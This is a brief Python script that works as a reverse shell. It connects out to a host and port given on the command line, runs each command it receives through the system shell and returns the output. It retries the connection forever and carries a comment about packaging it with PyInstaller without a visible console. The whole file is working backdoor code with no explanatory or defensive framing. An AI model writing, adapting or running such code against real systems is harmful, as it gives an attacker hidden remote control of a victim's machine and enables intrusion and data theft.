#!/usr/bin/env python
import os
from time import sleep
from subprocess import Popen, PIPE
from socket import socket, AF_INET, SOCK_STREAM

def console(h, p, w=16):
    while 6:
        try:
            C = socket(AF_INET, SOCK_STREAM)
            C.connect((h, int(p)))
            S, R = C.send, C.recv
            NORESP = b"\xff"
            D = lambda I: I.decode("utf-8")
            A = lambda I: I.stdout.read() or I.stderr.read() or NORESP
            # pyinstaller --noconsole, Popen [Error 6]
            # https://bugs.python.org/issue3905#msg73408
            E = lambda I: Popen(I, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
            while 6: S(A(E(D(R(1024)))))
        except Exception:
            sleep(int(w))

if __name__ == "__main__":
    import sys
    console(*sys.argv[1].split(":"))
